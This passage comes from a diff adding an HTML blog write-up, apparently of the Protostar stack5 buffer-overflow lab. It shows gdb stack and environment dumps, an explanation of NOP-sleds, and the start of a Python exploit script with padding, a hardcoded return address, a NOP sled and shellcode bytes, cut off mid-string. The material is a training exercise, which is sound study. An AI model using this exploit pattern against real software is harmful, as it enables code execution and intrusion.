+&lt;span class=&quot;nv&quot;&gt;SSH_TTY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/pts/1
+&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user
+&lt;span class=&quot;nv&quot;&gt;LS_COLORS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0:di&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;34:ln&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:mh&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00:pi&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;33:so&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:do&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:bd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;33&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;01:cd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;33&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;01:or&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;01:su&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;37&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;41:sg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;43:ca&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;41:tw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;42:ow&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;34&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;42:st&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;37&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;44:ex&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;32:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tar&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tgz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.arj&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.taz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.lzh&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.lzma&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tlz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.txz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.zip&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.z&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.Z&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.dz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.gz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.lz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.bz2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.bz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tbz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tbz2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.deb&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rpm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.jar&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rar&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ace&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.zoo&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.cpio&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.7z&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.jpg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.jpeg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.gif&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.bmp&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.pbm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.pgm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ppm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tga&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xbm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xpm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tif&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tiff&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.png&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.svg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.svgz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mng&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.pcx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mov&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mpg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mpeg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.m2v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mkv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mp4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.m4v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mp4v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.vob&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.qt&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.nuv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.wmv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.asf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rmvb&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.flc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.avi&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fli&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.flv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.gl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.dl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xcf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xwd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.yuv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.cgm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.emf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.axv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.anx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.aac&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.au&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.flac&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.midi&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mka&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mp3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mpc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ra&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.wav&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.axa&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.oga&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.spx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xspf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:
+&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+&lt;span class=&quot;nv&quot;&gt;MAIL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/mail/user
+&lt;span class=&quot;nv&quot;&gt;PWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/user
+&lt;span class=&quot;nv&quot;&gt;LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_US.UTF-8
+&lt;span class=&quot;nv&quot;&gt;SHLVL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/user
+&lt;span class=&quot;nv&quot;&gt;LOGNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user
+&lt;span class=&quot;nv&quot;&gt;SSH_CONNECTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.0.183 53915 10.0.0.163 22
+&lt;span class=&quot;nv&quot;&gt;OLDPWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/protostar/bin
+&lt;span class=&quot;nv&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/bin/gdb
+&lt;span class=&quot;nv&quot;&gt;LINES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;47
+&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;131
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;x/500s &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff977:	 &lt;span class=&quot;s2&quot;&gt;&quot;/opt/protostar/bin/stack5&quot;&lt;/span&gt;
+0xbffff991:	 &lt;span class=&quot;s2&quot;&gt;&quot;USER=user&quot;&lt;/span&gt;
+0xbffff99b:	 &lt;span class=&quot;s2&quot;&gt;&quot;SSH_CLIENT=10.0.0.183 53915 22&quot;&lt;/span&gt;
+0xbffff9ba:	 &lt;span class=&quot;s2&quot;&gt;&quot;MAIL=/var/mail/user&quot;&lt;/span&gt;
+0xbffff9ce:	 &lt;span class=&quot;s2&quot;&gt;&quot;SHLVL=1&quot;&lt;/span&gt;
+0xbffff9d6:	 &lt;span class=&quot;s2&quot;&gt;&quot;OLDPWD=/opt/protostar/bin&quot;&lt;/span&gt;
+0xbffff9f0:	 &lt;span class=&quot;s2&quot;&gt;&quot;HOME=/home/user&quot;&lt;/span&gt;
+0xbffffa00:	 &lt;span class=&quot;s2&quot;&gt;&quot;SSH_TTY=/dev/pts/1&quot;&lt;/span&gt;
+0xbffffa13:	 &lt;span class=&quot;s2&quot;&gt;&quot;LOGNAME=user&quot;&lt;/span&gt;
+0xbffffa20:	 &lt;span class=&quot;s2&quot;&gt;&quot;_=/usr/bin/gdb&quot;&lt;/span&gt;
+0xbffffa2f:	 &lt;span class=&quot;s2&quot;&gt;&quot;COLUMNS=131&quot;&lt;/span&gt;
+0xbffffa3b:	 &lt;span class=&quot;s2&quot;&gt;&quot;TERM=xterm-256color&quot;&lt;/span&gt;
+0xbffffa4f:	 &lt;span class=&quot;s2&quot;&gt;&quot;PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&quot;&lt;/span&gt;
+0xbffffa8d:	 &lt;span class=&quot;s2&quot;&gt;&quot;LANG=en_US.UTF-8&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Therefore, it is preferable to “slide” the execution to the target address instead of pointing directly to it. To accomplish this, the usage of a &lt;em&gt;NOP-sled&lt;/em&gt; is needed.&lt;/p&gt;
+
+&lt;h4 id=&quot;nop-sled&quot;&gt;NOP-Sled&lt;/h4&gt;
+
+&lt;p&gt;A NOP-sled is a sequence of NOP instructions to make the execution slide to the next memory address with a valid instruction. A NOP-sled will be placed after the return pointer in the constructed payload. Using a large number of NOPs will increase the chance to jump into the crafted exploit, as if we miss and point to a NOP, it will just slide to the end of the payload which contains the instructions to be executed.&lt;/p&gt;
+
+&lt;h4 id=&quot;weaponization&quot;&gt;Weaponization&lt;/h4&gt;
+&lt;p&gt;To weaponize the vulnerability, a shellcode for Linux x86 Intel architecture based on &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-906.php&quot;&gt;Andres C. Rodriguez &lt;/a&gt;’s concept will be injected at the end of our payload. The Python script used to abuse the buffer overflow with a shellcode injection is:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xAA&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;returnPointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbffff7c0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;nop_sled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x83&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xc4&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x18&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xc0&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xdb&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xb0&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x06&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xcd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x80&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x53&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x68&lt;/span&gt;&lt;span 